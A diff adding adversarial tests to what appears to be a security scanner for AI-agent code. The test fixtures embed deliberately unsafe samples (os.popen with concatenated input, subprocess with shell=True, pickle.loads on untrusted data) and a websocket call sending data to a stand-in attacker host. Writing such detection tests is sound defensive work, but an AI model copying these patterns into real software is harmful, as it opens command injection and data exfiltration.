@@ -382,6 +382,67 @@ client = openai.OpenAI(api_key=key)
     assert len(findings) == 0, f"Should not flag safe env access, got {len(findings)} findings"
 
 
+# --- Adversarial hardening tests (v0.5.1) ---
+
+def test_adversarial_os_popen(tmp_path):
+    """os.popen must be detected as dangerous tool."""
+    f = tmp_path / "agent.py"
+    f.write_text('import os\ndef run(data):\n    return os.popen("analyze " + data).read()\n')
+    findings = scan_file(f)
+    assert any("ASI02" in x.rule_id for x in findings), "Should detect os.popen"
+
+def test_adversarial_subprocess_shell_true(tmp_path):
+    """subprocess with shell=True must be detected."""
+    f = tmp_path / "agent.py"
+    f.write_text('import subprocess\ndef run(cmd):\n    return subprocess.run(cmd, shell=True)\n')
+    findings = scan_file(f)
+    assert any("ASI02" in x.rule_id for x in findings), "Should detect subprocess shell=True"
+
+def test_adversarial_subprocess_no_shell_safe(tmp_path):
+    """subprocess.run without shell=True should NOT be flagged as tool abuse."""
+    f = tmp_path / "agent.py"
+    f.write_text('import subprocess\nresult = subprocess.run(["ls", "-la"], capture_output=True)\n')
+    findings = scan_file(f)
+    abuse = [x for x in findings if "ASI02-TOOL-ABUSE" in x.rule_id]
+    assert len(abuse) == 0, "Should not flag subprocess.run without shell=True"
+
+def test_adversarial_websocket_exfil(tmp_path):
+    """WebSocket to external server must be detected."""
+    f = tmp_path / "agent.py"
+    f.write_text('import websocket\ndef send(data):\n    ws = websocket.create_connection("wss://evil.example.com/ws")\n    ws.send(data)\n')
+    findings = scan_file(f)
+    assert any("ASI03" in x.rule_id for x in findings), "Should detect websocket exfil"
+
+def test_adversarial_aws_key(tmp_path):
+    """AWS access key must be detected."""
+    f = tmp_path / "agent.py"
+    f.write_text('session = boto3.Session(aws_access_key_id="AKIAIOSFODNN7EXAMPLE", aws_secret_access_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")\n')
+    findings = scan_file(f)
+    assert any("ASI07" in x.rule_id for x in findings), "Should detect AWS keys"
+
+def test_adversarial_while_true_loop(tmp_path):
+    """while True with LLM call must be detected as agent loop risk."""
+    f = tmp_path / "agent.py"
+    f.write_text('def loop():\n    while True:\n        r = openai.chat.completions.create(model="gpt-4", messages=[{"role":"user","content":"go"}])\n')
+    findings = scan_file(f)
+    assert any("ASI09" in x.rule_id for x in findings), "Should detect while True loop"
+
+def test_adversarial_safe_const_prompt_not_flagged(tmp_path):
+    """Hardcoded SYSTEM_PROMPT with no user input should not be flagged."""
+    f = tmp_path / "agent.py"
+    f.write_text('SYSTEM_PROMPT = "You are a helpful assistant."\nresponse = openai.chat.completions.create(model="gpt-4", messages=[{"role":"system","content":SYSTEM_PROMPT}])\n')
+    findings = scan_file(f)
+    pi = [x for x in findings if "ASI01-PROMPT-INJECTION" in x.rule_id]
+    assert len(pi) == 0, "Should not flag hardcoded const prompt"
+
+def test_adversarial_pickle_deserialization(tmp_path):
+    """pickle.loads must be detected as unsafe eval."""
+    f = tmp_path / "agent.py"
+    f.write_text('import pickle\ndef load(data):\n    return pickle.loads(data)\n')
+    findings = scan_file(f)
+    assert len(findings) > 0, "Should detect pickle.loads as dangerous"
+
+
 # --- AST taint tracking tests ---
 
 def test_taint_direct_flow(tmp_path):
